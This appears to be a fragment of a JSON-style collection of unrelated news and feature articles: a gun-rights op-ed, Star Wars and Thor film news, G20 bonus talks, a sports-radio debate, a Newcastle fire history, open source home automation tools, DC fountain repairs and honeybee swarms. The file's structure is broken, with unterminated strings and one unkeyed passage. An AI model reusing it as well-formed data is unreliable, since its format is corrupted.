Russian plane was shot down.",

  "latent_6736": "December 12, 2017\n\nRetired Brass Off Target Trumpeting for Gun Restrictions\n\nBy Mark Oliva\n\nSixteen of our nation’s senior military officers recently penned a letter to Congress under the banner of the Giffords Veteran Coalition. They chose to lend their military authority and prestige to assist an ongoing political effort to further restrict their fellow law-abiding American citizens’ Constitutional right to keep and bear arms because they mistakenly believe they know how to reduce criminal misuse of firearms.\n\nGenerals and admirals, this is something that I just can’t salute.\n\nThe retired military leaders, who of course deserve accolades for leading forces in combat and humanitarian operations, cited the recent tragedy in Sutherland Springs, Texas, to call for more gun control laws. Unfortunately, they never mentioned that our nation’s military itself had the tools to prevent this tragedy from ever happening but failed tragically in that mission.\n\nThe Sutherland murderer had been convicted of domestic violence in a court-martial and involuntarily committed to a mental health facility before being booted from the Air Force with a bad conduct discharge. At least two of these instances would have been enough to bar the murderer from buying a firearm. But the FBI’s National Instant Criminal Background Check System (NICS) was not informed of these facts because the Department of Defense never submitted the required disqualifying records. Because of DoD’s failure to follow its own regulations and our nation’s laws, this murderer was able to buy guns not just once, but four separate times. Each time he passed the background check.\n\nUnder the NICS Improvement Amendments Act of 2007, the military services were required to submit these records. The flag-level officers didn’t mention the DoD’s own instruction ordering compliance with the law. Nor was there mention of the Inspector General’s reports criticizing the military’s failure in its obligation to submit names of prohibited persons to the NICS database.\n\nThe generals and admirals tell Congress their command experience is foundational to their moral authority to call for restrictions on law-abiding American gun owners. They didn’t tell Congress, though, that during the height of the fighting, while Army General Petraeus commanded Coalition forces, Iraqi families could keep a fully-automatic AK-47 and 30-round magazine in their homes. U.S. forces didn’t want these families left defenseless against the terrorists who preyed on them.\n\nThis was the practice during my tour in Fallujah in 2006-2007. It was just one of several combat tours to Iraq and Afghanistan during my 25-year Marine Corps career. I trusted my life to their battlefield decision making. Yet, their letter wrongly blames the firearms, accessories and laws recognizing the fundamental right of Americans to keep and bear arms for the criminal activities of individuals.\n\nThere is a cognitive dissonance that these generals and admirals would seek restrictions on law-abiding Americans, who are only looking to make the best choice to protect themselves and their families. They never saw the same need in a nation under martial law with no Second Amendment rights. They advocate banning modern sporting rifles, the most popular rifle sold today. Nearly half of those who own these are former active and former military and law enforcement. They buy them primarily for target shooting, which follows a long history in the United States of service members in civilian life purchasing firearms similar to the rifle they used in uniform for lawful purposes like target shooting and hunting. Their opposition to this, and other measures, doesn’t pass muster.\n\nInstead of endorsing new laws that criminals would not obey, the generals and admirals should devote their energy and commit their prestige to helping ensure that the laws already on the books are enforced. That includes keeping firearms out of the hands of prohibited persons by ensuring that disqualifying records are submitted to the system designed to help protect their fellow citizens. Sixteen retired generals and admirals do not speak for the overwhelming veteran population who know and treasure their Second Amendment rights.\n\nAbout the Author\n\nMark Oliva is Manager, Public Affairs for the National Shooting Sports Foundation, the trade association for the firearms and ammunition and industries. He is a retired Marine Master Gunnery Sergeant with 25 years of service, including tours in Iraq, Afghanistan, Haiti, Albania and Zaire.\n\nYou may also be interested in:21 State Attorneys General Defend Second Amendment Rights in Kolbe v.

  "latent_6788": "Star Wars: The Last Jedi director Rian Johnson is returning to the Star Wars universe for an entire new Star Wars trilogy. The new trilogy will focus on stories outside of the Skywalker saga. This news coincides with recent comments from Lucasfilm President Kathleen Kennedy about Star Wars films planned for after the current trilogy ends.\n\nWe gathered in the /Film bunker for an emergancy episode of /Film Daily, Peter Sciretta is joined by /Film weekend editor Brad Oman and Nerdist writer Amy Radcliffe to discuss the big breaking Star Wars news. You can subscribe to /Film Daily on iTunes, Google Play, Overcast and all the popular podcast apps (here is the RSS URL if you need it). Our original news story follows below.\n\n***\n\nRian Johnson isn’t done with Star Wars – he’s just getting started. While Johnson’s Star Wars: The Last Jedi isn’t hitting theaters until next month, the filmmaker has already begun plans on a brand new Star Wars trilogy. The official Star Wars site just announced the news that Johnson has planned out a new trilogy “separate from the episodic Skywalker saga,” and that “Johnson will introduce new characters from a corner of the galaxy that Star Wars lore has never before explored.”\n\n“Star Wars is the greatest modern mythology and we feel very lucky to have contributed to it,” Johnson said. “We can’t wait to continue with this new series of films.”\n\nThis news comes on the heels of Lucasfilm President Kathleen Kennedy’s recent comments about future Star Wars films. In an interview with The Star Wars Show, Kennedy said, “We’re looking at the next 10 years of Star Wars stories…We’re looking at narratively where that might go; future stories beyond Episode IX with these new characters – Rey, Poe, Finn, BB-8. We’re also looking at people who are interested in coming into the Star Wars world and taking us places we haven’t been yet.”\n\nWith the news of the new trilogy announcement, Kennedy added, “We all loved working with Rian on The Last Jedi…He’s a creative force, and watching him craft The Last Jedi from start to finish was one of the great joys of my career. Rian will do amazing things with the blank canvas of this new trilogy.”\n\nThe most exciting element of this news – besides the involvement of a highly talented filmmaker like Johnson – is the prospect of opening up the Star Wars galaxy. So far, every Star Wars film, even the anthology film Rogue One and the upcoming Solo: A Star Wars Story, is connected in some way to the Skywalker saga. These films are covering ground, and characters, we’re already aware of. Johnson’s new trilogy promises to move us beyond that, which is great. There’s a whole galaxy out there, after all. It’d be nice to get to see a lot more of it. This is also a huge vote of confidence for Johnson, proving that Lucasfilm and Disney are thrilled with what he did with The Last Jedi.\n\nJohnson will write and direct the first film in the trilogy, with his longtime collaborator Ram Bergman producing. No date has been set yet for any of these films, so keep your eyes peeled for that eventual announcement.\n\nStar Wars: The Last Jedi opens December 15, 2017.",
  "latent_6973": "Banks and the recovery will dominate the finance ministers' agenda Deepening divisions have appeared among international finance ministers, meeting in London, about how to curb excessive bank bonuses. French Finance Minister Christine Lagarde has promised to launch an \"onslaught\" against large payouts. The UK has dismissed the idea, while other countries remain concerned about how best to recover from the recession. The issues are set to dominate a meeting of the G20 group of leading developed and emerging economies. At their meeting - a preparatory session for the next full G20 summit - G20 finance ministers will consider whether recent signs of economic improvement should be followed by a reverse of some of the emergency measures implemented to stimulate the global economy. France, Germany and Japan have all shown positive growth in recent months. At the opening of the meeting on Saturday, British Prime Minister Gordon Brown warned that withdrawing government support too early could undermine economic recovery. \"The IMF argue and Mr Strauss-Kahn (head of the IMF) is here to say this, fiscal policies should continue to support economic activity until economic recovery has taken hold. \"It is clear in my view that too early a withdrawal of vital support could undermine the tentative signs of recovery we are now seeing and lead to a further downward lurch in business and consumer confidence, reducing growth and employment and actually worsening governments' debt positions over the longer term.\" 'Rules' on bonuses Mr Brown also called for consistent rules on bankers' pay and bonuses. \"We cannot accept a return to the past ways of governance. Specifically, pay and bonuses cannot reward failure or encourage unacceptable risk taking,\" he said. Outlining her opposition to the bonus culture, Mrs Lagarde earlier told the BBC that bonuses had contributed to the global financial crisis and needed to be capped. Lagarde said the world was still suffering from events a year ago \"What happened 12 months ago was just horrible for our societies, it was horrible for our economies, and we are still suffering as a result,\" she said. France is proposing a series of mandatory caps on bonuses - which the head of the Eurogroup of eurozone finance ministers, Luxembourg's Jean-Claude Juncker, said he \"totally supported\". But Britain's Chancellor Alistair Darling has described the idea of a cap as \"unworkable\", instead favouring rules linking bankers' pay to long-term performance. The BBC understands that Chancellor Alastair Darling will propose that bonus payments be paid out over five years and only in the form of stock options. The plan envisages that the bulk of the bonus be paid in the final two years of that five year period and includes claw-back clauses. The suggestion by Mr Darling goes some way to meet the concerns of many other EU governments who had suggested an outright cap on bonuses, says the BBC's Joe Lynham. US Treasury Secretary Tim Geithner is also understood to be opposed to a cap on bonuses. He is pressing for new measures to prevent a repeat of the banking crisis, says BBC economics correspondent Andew Walker. Mr Geithner wants banks to hold more capital to protect themselves against losses. Emerging economies warn Holding a mini-summit away from the G20 meeting, ministers from emerging economies Brazil, Russia, India and China (Bric) called for caution, warning it was \"too early\" to talk of an end to the crisis. The global economy still faces great uncertainty, and significant risks remain to economic and financial stability\n\nBric statement\n\nFinance ministers face tough talks G20: Economic summit snapshot The huge cash injections pumped into businesses by governments around the world could not be withdrawn in a hurry without causing new problems, they said. Brazilian Finance Minister Guido Mantega added that \"the exit should be gradual\" as withdrawing state aid to economies too quickly \"would not send a good signal to the markets\". \"The global economy still faces great uncertainty, and significant risks remain to economic and financial stability,\" the four countries, known as the Bric quartet, said after their mini-summit. Of European nations, Germany wants the G20 countries to start discussing when and how to withdraw stimulus measures, but fellow European Union members have been reluctant. Ms Lagarde said the timing of any withdrawal was something that \"God only knows\". How do you feel about bank bonuses? Should they be regulated? Can regulation be enforced?

  "latent_7014": "It shouldn’t come as a surprise to read the NBA Finals, a rubber match between the Golden State Warriors and Cleveland Cavaliers, are the most-watched since Michael Jordan’s final championship in 1998.\n\nNor should it shock you to read the NBA Finals are dominating the NHL’s Stanley Cup Finals, tied at two games apiece between the Pittsburgh Penguins and Nashville Predators, in national television ratings.\n\nChris Russell of 106.7 The Fan would have you know, if the NHL were merely shoved down American sporting fans’ throats the way the NBA is, the two sports would be nearly identical in popularity.\n\n“Everybody says that the NHL should promote itself better, that if they promoted itself better, if they had better storylines or higher-profile individual athletes, that they would get better ratings,” Russell formulated his argument to Chad Dukes and Nick Ashooh on Monday.\n\n“And my contention is it takes the media, as a fuel to that vehicle, to drive that train, to drive that platform, to give that opportunity,” he said. “And when you give 10 minutes on ‘First Take,’ or ‘Hot Take’ — or whatever [the show] is called — to Draymond Green’s mom, after doing an hour and 50 minutes on a terrible, uninteresting NBA Finals already, it pisses me off that you won’t even acknowledge P.K. Subban and the NHL Finals.”\n\nWelcome to Chris Russell’s Super Bowl.\n\nOnly once a year is he blessed with the good fortune of making this absurd argument, that the NBA — despite all empirical evidence — only remains more popular than hockey in the U.S., not by popular demand, but by an overabundance of media coverage.\n\n“See, isn’t that laughable enough that he makes that statement and we’re supposed to just take it seriously?” Ashooh retorted. “Chris, you’ve got to remember hockey is a very regional sport. It doesn’t take away from the great playoffs that we’ve had. Most people growing up in America didn’t grow up playing hockey. They’re not familiar with P.K. Subban and his bad breath and everything else in the NHL.”\n\n“We’re interested in things that we’re familiar with when it comes to sports, or just things in society,” he added. “We grow up playing basketball. We knew who LeBron James was when he was 14 years old.”\n\n“My point is that people only care about what is shoved down their throat,” Russell said. “And I used this example: ‘American Idol’ was the most hyped reality television show in the world, just constantly shoved down your throat everywhere. It was the talk of everything for years, and years and years. You just couldn’t get away from it. As soon as people just got bored with it, tired of it, stopped talking about it, the damn show went away.”\n\n“What TV show in the history of mankind hasn’t run its course?” Ashooh replied. “You can’t take TV shows and compare them to sports. It’s not the same thing.”\n\n“By the way,” Dukes chimed in. “Do you know how old the NHL is going to turn this year?”\n\n“Yes,” Russell answered. “100.”\n\n“Right. We’ve had 100 years. Nobody likes it,” Dukes said. “It’s had its shot. It’s over. There’s a bunch of you nerds that like it — great, enjoy yourself — the rest of us have decided that we’d rather watch something else. That has nothing to do with the media, nothing to do with it.”\n\n“I’ve watched it,” he added. “It’s okay.”\n\nRussell’s argument weaved in and out of coherence over the course of 15 outrageous minutes. At one point, he tied the presidential election into his elaborate equation: “Trump was elected president because he was given a platform over, and over, and over and over again to influence and hoodwink about 50 bazillion dumb Americans. …Trump won the election with no help from the media, right?

  "latent_7161": "(As released) It has been four years since audiences have seen Tom Hiddleston don Loki’s golden horns on the big screen, and now the \"God of Mischief\" is back in Philippine cinemas this October 25 for \"Thor: Ragnarok.\"\n\nOn the set of \"Thor: Ragnarok,\" Hiddleston talked about the adopted son of Odin, and the many complex relationships that happen to revolve around the trickster’s mercurial spirit.\n\n“The opposite of love is not hate but indifference,” Hiddleston discussed how Thor being indifferent to Loki is troubling for the character from a familial point of view. “That’s a defining feature of his character. I don’t belong in the family; I hate my brother. And the idea his brother’s like, yeah, whatever, it’s an interesting development.”\n\n“The two of them are placed in such an extraordinary situation where everything is unfamiliar; that their familiarity, literally, as family members becomes important.” The now famous scene from the teaser trailer of the Asgardian brothers fighting side by side shows how the siblings seem to have come terms—at least temporarily—with their complicated relationship.\n\n“Loki’s feelings towards his family members are complex, to say the least,” Hiddleston reflected on the first film. “The moment of Thor’s ascension, he finds out he doesn’t belong there at all. I never conceived of Loki’s emotional connections to Odin or Thor as malevolent. He just wants to have a go on the throne, which he does.”\n\nWhen it comes to complex relationships, Hulk knows a thing or two about burying your feelings. The big green guy is added to the mix in Ragnarok and Hiddleston thinks fans are going to enjoy their interaction, “In The Avengers, Hulk and Loki never really had a conversation. It was more, more of a physical meeting, an extended group hug, shall we say,” joked Hiddleston. “So it’s fun when the two of them meet.”\n\nFinally, there’s a new villain in town and her name is Hela, “The goddess of death shows up and the stakes are high, for everybody,” said Hiddleston. “Loki perhaps more than ever, is challenged to define himself in the face of that threat.”\n\nRegarding the dynamic between Loki and Hela, Hiddleston said, “It’s about them recognizing each other; recognizing that we prefer anarchy to order; recognizing that chaos is more fun, if a little exhausting; recognizing the aesthetic value of green capes. The inimitable elegances of a headdress—if you’re gonna be bad, you might as well be bad with style.”\n\nSpeaking of style, perhaps Loki’s relationship vulnerability is manifesting itself in his wardrobe? When asked about Loki’s multiple costume changes, Hiddleston pondered Loki’s \"Pretty Woman\" moment, “In my head, Jeff Goldblum takes Loki out to Rodeo Drive and says, pick the finest fabric you can find; let’s fashion your suit.” If this isn’t a cry for an Asgardian version of Project Runway, then this is a real missed opportunity.\n\nDirected by Taika Waititi from a script by Craig Kyle & Christopher Yost and Stephany Folsom and Eric Pearson, \"Thor: Ragnarok\" picks up after the events of \"Avengers: Age of Ultron.\"\n\nIn Marvel Studios’ \"Thor: Ragnarok,\" Thor (Chris Hemsworth) is imprisoned on the other side of the universe without his mighty hammer and finds himself in a race against time to get back to Asgard to stop Ragnarok—the destruction of his homeworld and the end of Asgardian civilization—at the hands of an all-powerful new threat, the ruthless Hela (Cate Blanchett). But first he must survive a deadly gladiatorial contest that pits him against his former ally and fellow Avenger—the Incredible Hulk (Mark Ruffalo).\n\nThe film stars Chris Hemsworth, Tom Hiddleston, Cate Blanchett, Idris Elba, Jeff Goldblum, Tessa Thompson, Karl Urban with Mark Ruffalo and Anthony Hopkins.

They were crowding on to bridges and some were even climbing up boat masts on the Tyne to get a better view.\"\n\nImage copyright Mark Thoburn Image caption After the fire had been raging for hours there were two small explosions then a massive blast which brought down buildings\n\nMr Thorburn said that as the mill became overwhelmed by the fire it spread and the sulphur in the warehouse melted, cascading purple liquid out the windows into the Tyne.\n\nThe violet-flamed puddles formed on the water providing a mesmerising sight for onlookers.\n\nDr Turnbull said: \"Sulphur has quite a low melting point and the molten liquid would have been pouring out of the warehouse at quite a rate.\n\n\"There would have been puddles of sulphur with violet flames, Even on the other side of the Quayside you'd have been able to see all this in its full glory.\n\nImage copyright Lonely Tower Film Image caption Snap from 1854 of the devastated quayside after the inferno\n\nAfter the fire had been raging for a couple of hours, there were two explosions.\n\nMs Lang said: \"There were a couple of small explosions and sadly this was the time people should have moved when the ticking time bomb began, but they didn't.\n\n\"This to modern ears would have been a warning to get away.\"\n\nAfter recreating the conditions in his lab, Dr Turnbull believes that cement dust could have been the catalyst for the next almighty explosion that rocked the Quayside, and not gunpowder.\n\nImage copyright Mark Thoburn Image caption The sulphur melted sending purple cascades of liquid into the Tyne\n\nHe said: \"Flames getting into areas where sulphur gases had built may have been to blame.\n\n\"When we've got very finely ground particles like dust and they became airborne by a gust of wind and into the path of a flame, they can flare up.\n\n\"There were casks of cement dust there at the time.\"\n\nMs Lang said: \"Miners actually came out of pits because they heard the explosion - it was like a volcano.\"\n\nAccording to records, the inferno claimed victims miles away including Frank Conway, 6, who died after being hit by masonry going through the roof of his home as he slept.\n\nSarah Hutchinson, 65, of Rabbit Bank, is said to have died of fright.\n\nBut there were some crumbs of comfort to come from the disaster.\n\nMr Thorburn said that thanks to the generosity of a relief fund many families were given £50, making them better off than before the fire.",

  "latent_7310": "Editor's note: This article was originally published in March 2016 and has been updated to include additional options and information.\n\nThe Internet of Things isn't just a buzzword, it's a reality that's expanded rapidly since we last published a review article on home automation tools in 2016. In 2017, 26.5% of U.S. households already had some type of smart home technology in use; within five years that percentage is expected to double.\n\nWith an ever-expanding number of devices available to help you automate, protect, and monitor your home, it has never been easier nor more tempting to try your hand at home automation. Whether you're looking to control your HVAC system remotely, integrate a home theater, protect your home from theft, fire, or other threats, reduce your energy usage, or just control a few lights, there are countless devices available at your disposal.\n\nBut at the same time, many users worry about the security and privacy implications of bringing new devices into their homes—a very real and serious consideration. They want to control who has access to the vital systems that control their appliances and record every moment of their everyday lives. And understandably so: In an era when even your refrigerator may now be a smart device, don't you want to know if your fridge is phoning home? Wouldn't you want some basic assurance that, even if you give a device permission to communicate externally, it is only accessible to those who are explicitly authorized?\n\nSecurity concerns are among the many reasons why open source will be critical to our future with connected devices. Being able to fully understand the programs that control your home means you can view, and if necessary modify, the source code running on the devices themselves.\n\nWhile connected devices often contain proprietary components, a good first step in bringing open source into your home automation system is to ensure that the device that ties your devices together—and presents you with an interface to them (the \"hub\")—is open source. Fortunately, there are many choices out there, with options to run on everything from your always-on personal computer to a Raspberry Pi.\n\nHere are just a few of our favorites.\n\nCalaos\n\nCalaos is designed as a full-stack home automation platform, including a server application, touchscreen interface, web application, native mobile applications for iOS and Android, and a preconfigured Linux operating system to run underneath. The Calaos project emerged from a French company, so its support forums are primarily in French, although most of the instructional material and documentation have been translated into English.\n\nCalaos is licensed under version 3 of the GPL and you can view its source on GitHub.\n\nDomoticz\n\nDomoticz is a home automation system with a pretty wide library of supported devices, ranging from weather stations to smoke detectors to remote controls, and a large number of additional third-party integrations are documented on the project's website. It is designed with an HTML5 frontend, making it accessible from desktop browsers and most modern smartphones, and is lightweight, running on many low-power devices like the Raspberry Pi.\n\nDomoticz is written primarily in C/C++ under the GPLv3, and its source code can be browsed on GitHub.\n\nHome Assistant\n\nHome Assistant is an open source home automation platform designed to be easily deployed on almost any machine that can run Python 3, from a Raspberry Pi to a network-attached storage (NAS) device, and it even ships with a Docker container to make deploying on other systems a breeze. It integrates with a large number of open source as well as commercial offerings, allowing you to link, for example, IFTTT, weather information, or your Amazon Echo device, to control hardware from locks to lights.\n\nHome Assistant is released under an MIT license, and its source can be downloaded from GitHub.\n\nMisterHouse\n\nMisterHouse has gained a lot of ground since 2016, when we mentioned it as \"another option to consider\" on this list. It uses Perl scripts to monitor anything that can be queried by a computer or control anything capable of being remote controlled. It responds to voice commands, time of day, weather, location, and other events to turn on the lights, wake you up, record your favorite TV show, announce phone callers, warn that your front door is open, report how long your son has been online, tell you if your daughter's car is speeding, and much more. It runs on Linux, macOS, and Windows computers and can read/write from a wide variety of devices including security systems, weather stations, caller ID, routers, vehicle location systems, and more\n\nMisterHouse is licensed under the GPLv2 and you can view its source code on GitHub.\n\nOpenHAB\n\nOpenHAB (short for Open Home Automation Bus) is one of the best-known home automation tools among open source enthusiasts, with a large user community and quite a number of supported devices and integrations. Written in Java, openHAB is portable across most major operating systems and even runs nicely on the Raspberry Pi. Supporting hundreds of devices, openHAB is designed to be device-agnostic while making it easier for developers to add their own devices or plugins to the system. OpenHAB also ships iOS and Android apps for device control, as well as design tools so you can create your own UI for your home system.\n\nYou can find openHAB's source code on GitHub licensed under the Eclipse Public License.\n\nOpenMotics\n\nOpenMotics is a home automation system with both hardware and software under open source licenses. It's designed to provide a comprehensive system for controlling devices, rather than stitching together many devices from different providers. Unlike many of the other systems designed primarily for easy retrofitting, OpenMotics focuses on a hardwired solution. For more, see our full article from OpenMotics backend developer Frederick Ryckbosch.\n\nThe source code for OpenMotics is licensed under the GPLv2 and is available for download on GitHub.\n\nThese aren't the only options available, of course. Many home automation enthusiasts go with a different solution, or even decide to roll their own. Other users choose to use individual smart home devices without integrating them into a single comprehensive system.\n\nIf the solutions above don't meet your needs, here are some potential alternatives to consider:\n\nEventGhost is an open source (GPL v2) home theater automation tool that operates only on Microsoft Windows PCs. It allows users to control media PCs and attached hardware by using plugins that trigger macros or by writing custom Python scripts.\n\nioBroker is a JavaScript-based IoT platform that can control lights, locks, thermostats, media, webcams, and more. It will run on any hardware that runs Node.js, including Windows, Linux, and macOS, and is open sourced under the MIT license.\n\nJeedom is a home automation platform comprised of open source software (GPL v2) to control lights, locks, media, and more. It includes a mobile app (Android and iOS) and operates on Linux PCs; the company also sells hubs that it says provide a ready-to-use solution for setting up home automation.\n\nLinuxMCE bills itself as the \"'digital glue' between your media and all of your electrical appliances.\" It runs on Linux (including Raspberry Pi), is released under the Pluto open source license, and can be used for home security, telecom (VoIP and voice mail), A/V equipment, home automation, and—uniquely—to play video games.\n\nOpenNetHome, like the other solutions in this category, is open source software for controlling lights, alarms, appliances, etc. It's based on Java and Apache Maven, operates on Windows, macOS, and Linux—including Raspberry Pi, and is released under GPLv3.\n\nSmarthomatic is an open source home automation framework that concentrates on hardware devices and software, rather than user interfaces. Licensed under GPLv3, it's used for things such as controlling lights, appliances, and air humidity, measuring ambient temperature, and remembering to water your plants.\n\nNow it's your turn: Do you already have an open source home automation system in place? Or perhaps you're researching the options to create one. What advice would you have to a newcomer to home automation, and what system or systems would you recommend?\n\nAre you interested in reading more articles like this?

  "latent_7559": "The World War II Memorial fountain gushes with energy. (Evelyn Hockstein/For The Washington Post)\n\nIt was a typical summer morning in downtown Washington, with tourists thick on the hot sidewalks, and Tony Truesdale in a hole beneath them, trying to bring another dead fountain back to life.\n\n“I got water,” Truesdale shouted from the dank pit of a pump room at the Bolívar memorial, dedicated in 1959, a block from the Mall. An encouraging burble shook the nest of ancient steel tubes and midcentury valves just as a silhouetted head appeared in the square of sunlight above.\n\n“You got water?” Joe Gallo, one of Truesdale’s fellow National Park Service plumbers, called down. Behind him, contractors were snaking high-pressure hoses through pipes that were laid decades ago and have been clogged for years.\n\n“It’s coming through,” Gallo said.\n\nSummer is fountain-fighting season in the nation’s capital, as teams of Park Service water whisperers strain to keep more than 60 pools, ponds, spouts and cascades flowing across the city’s monumental core.\n\nFrom the pocket parks — such as this six-spouter at the Bolívar memorial — to the grand gushers of the National World War II Memorial, they do months of battle with 19th-century plumbing, balky pumps and an $850 million maintenance backlog, not to mention gravity, algae and historic preservationists.\n\nBernard Addison, left, and Marvin Evans from Spartan Plumbing, work to repair the Bolivar fountain in front of the Interior Department. (Evelyn Hockstein/For The Washington Post)\n\n“It’s beautiful when you get everything going,” Truesdale said as he tightened a connection in preparation for installing a new pump for the Bolívar fountain. “But something else crops up every day. Nobody likes it when they go down.”\n\nDry fountains are the empty storefronts of public architecture, depressing testaments to civic shortcomings. When running, they rush with life and energy. When they fail, they are sad clowns amid the marble — mute and downcast.\n\n“There’s a statement of public welfare in having a fountain,” said Thomas Luebke, secretary of the U.S. Commission of Fine Arts, the body charged with upholding the architectural force of federal Washington. “It speaks to the idea of common good and a competent government. When you have an empty pool that is supposed to be a central feature, the place loses its soul.”\n\n[Lincoln Reflecting Pool nearly ready after $34 million reconstruction]\n\nAlmost half of the Park Service water features in the District are in need of repair, including damaged grates at the cauldron-like spout on Theodore Roosevelt Island and the strainers and impeller motors at the U.S. Navy Memorial. The towering Dupont Circle fountain is tilting, its huge top basin inching off-kilter and slowly spoiling the flow from its three scuppers.\n\nSome water features seem permanently derelict, most notably the enormous Columbus fountain outside Union Station, dry for a decade and futilely awaiting a $10 million overhaul. That one was built in 1912 with the waterworks buried within the sculpture; getting to the pipes will take not just plumbers but art conservators.\n\n“Each one of these things is unique,” said Jeff Gowen, the National Mall and Memorial Parks facilities manager. “They never go away, but they do get to a point where we can no longer operate them.”\n\nAnthony Truesdale, a National Park Service maintenance mechanic, works on the plumbing below the Bolivar fountain. (Evelyn Hockstein/For The Washington Post)\n\nThe pump room for the World War II Memorial fountain, where every pipe and valve is meticulously labeled. (Evelyn Hockstein/For The Washington Post)\n\nFountains have been a darling of grand urban thinkers since the Romans strung the aqueducts. The 18th-century mastermind of Washington’s layout, Pierre L’Enfant, was raised amid the fountains at the French palace of Versailles and wanted them scattered throughout the new capital. The 1902 report from the McMillan Commission to update the Mall envisioned water everywhere, including several fountains at the base of the Washington Monument, which were never built.\n\nBut plenty were, and decades later, the Park Service crews wrestle with an expanding portfolio that ranges from the historic to the high-tech. Behind timeless public facades, every hard-won year shows, such as the pump chamber of the Columbus Circle fountain. Hidden beneath a hatch passed by thousands of commuters and pedestrians each day, the chamber is filled with a Jules Verne contrivance of pits and pipes and analog valves.\n\n“Like something out of the Titanic,” marveled Park Service spokesman Mark Litterst.\n\nAt the other extreme, stepping through the huge flood-proof door beneath the 2004 World War II Memorial is more like boarding a nuclear submarine. Every massive pump hums beneath bright lights; every pipe and valve is meticulously labeled. Containers of chlorine are neatly stacked.\n\nMany of the water features, including the 1997 Franklin Delano Roosevelt Memorial, empty directly into storm drains, which limits the chemical treatments that technicians can use to clear the algae. The oldest fountains weren’t built to recirculate water, instead they draw thousands of gallons of it an hour from the city supply, spraying it once in the air and letting it drain away.\n\n“It’s like turning on the spigot at your house and letting it run all summer,” Gowen said. Most of those old fountains have since been converted, he said.\n\nLewis Simpson, left, and Kareem Wilson, Park Service maintenance workers, power wash the fountain at the Korean War Memorial. (Evelyn Hockstein/For The Washington Post)\n\nEven a working fountain is like a toddler, beloved but needing constant attention. In the days before South Korean President Moon Jae-in’s recent state visit, workers trying to steam clean the pool at the Korean War Veterans Memorial were stymied by a busted electrical component that prevented them from even draining it.\n\n“You can’t make this stuff up,” Gowen said.\n\n“A fountain is a beautiful pain in the [butt],” said Ruth Robbins, president of Friends of Chevy Chase Circle, a neighborhood group that formed largely out of frustration with the anemic fountain sitting in the middle of that gateway traffic circle in Northwest Washington. The group, one of several local efforts to supplement federal maintenance, paid for a new brass fountainhead in the 1990s and has raised $80,000 toward a new pump and plumbing.\n\n“The Park Service does the best they can, but we understand their resource and staffing issues,” Robbins said.\n\n[Is a people-watching paradise in peril?]\n\nAt Meridian Hill’s Italianate cascading fountain — the longest in North America, according to the Park Service — residents have formed a kind of neighborhood fountain watch to alert officials to problems that have led to more frequent dry outs.\n\nA beautiful cascading water feature at Meridian Hill Park in Northwest Washington works, but the fountain at the top is empty. (Evelyn Hockstein/For The Washington Post)\n\nAnd the National Gallery of Art last year took over the Mellon Memorial Fountain outside its front door, raising private money to rehab a high-profile water feature that had been fallow since 2008.\n\nThe Park Service is attempting to bring back another dormant fountain: the Bolívar memorial, which sits directly outside the front door of the Interior Department. Agency staffers couldn’t determine the last time the rectangular pool had spouted water, and many passing pedestrians didn’t know that the fetid green pool was once a handsome fountain.\n\n“It was basically a wildlife refuge,” Truesdale said, pulling out his phone to show pictures of the muck they had pumped out a few weeks earlier.\n\nIn his confirmation hearing, newly installed Interior Secretary Ryan Zinke cited the need to fix Washington fountains as part of addressing the $12.5 billion maintenance list at parks throughout the country.

  "latent_7564": "Reading Time: 6 minutes\n\n10.8k SHARES TheOrganicView TheOrganicView\n\nA Deeper Understanding Of Honeybees\n\nRecently, I interviewed Dr. Randolf Menzel, a world-renowned Neurobiologist and Professor Emeritus, at the Free University of Berlin about his fascinating work with honeybee brains. He mentioned another brilliant scientist, Dr. Thomas D. Seeley, a professor from Cornell University, who also wrote the book, Honeybee Democracy. Dr. Seeley, much like his esteemed colleague, view honeybees with great respect, admiration and understanding.\n\nNow that Spring has arrived, honeybees are beginning to swarm. Most people do not understand why bees swarm much less the benefit of a swarm. In this interview, Dr. Seeley explains how sophisticated the honeybee is as an individual as well as how each bee works together within the colony. It is truly amazing!\n\nA honeybee must learn how to navigate to and from the hive without a GPS system, map,etc. Think about how many times a human being must learn something before it has been mastered!\n\nDon’t Overreact To Swarms\n\nSome people are quick to call an exterminator or use a chemical to kill the swarm. My good friend and bee advocate, Tom Theobald commented that “killing a swarm is like killing a puppy”!\n\nSo, what should you do if there is a swarm that is in an undesirable location (such as your garage, playhouse, etc.? Call a beekeeper! If you don’t know of any local beekeepers, google beekeeping clubs in your area or contact your local extension for references.\n\nMost beekeepers are more than happy to retrieve them and may not charge, especially since so many honeybees have been devastated due to neonicotinoid exposure which has drastically reduced honeybee populations.\n\nSwarms: A Bee-utiful Future!\n\nAccording to Dr. Seeley, “if someone sees a swarm, it is really important and valuable to realize that:\n\na: these bees are not defensive and not dangerous\n\nb: these bees are not taking up residence where they are clustering.\n\nThey are in a temporary bivouac in the process of looking for a new home and they are going to move on. No need to call the exterminator and no need to get in a panic. In a few days, the bees will be gone!”\n\nListen To The Interview\n\nIn this segment of The Organic View Radio Show, Dr. Thomas D. Seeley, Horace White Professor in Biology and Chair, Department of Neurobiology and Behavior, Cornell University, explains to host, June Stoyer, why swarms are vital for a honeybee colony and should be protected. Please click the link in the video to listen to the interview.\n\nLearn About Dr. Thomas D. Seeley\n\nDr. Seeley received his undergraduate degree in chemistry from Dartmouth College. He received his PhD in 1978 from Harvard University, where he studied with Bert Hölldobler and Edward O. Wilson. He held a postdoctoral fellowship in the Society of Fellows at Harvard until 1980, when he accepted a faculty position at Yale University. He remained there until 1986, when he joined the Department of Neurobiology and Behavior at Cornell University.\n\nIn recognition of his scientific work, he has received the Alexander von Humboldt Distinguished U.S. Scientist Prize, been awarded a Guggenheim Fellowship, received a Gold Medal Book Award from Apimondia for The Wisdom of the Hive, and been elected a Fellow of both the Animal Behavior Society and the American Academy of Arts and Sciences. His most enduring honor, though, is to have had a species of bee named after him: Neocorynurella seeleyi",

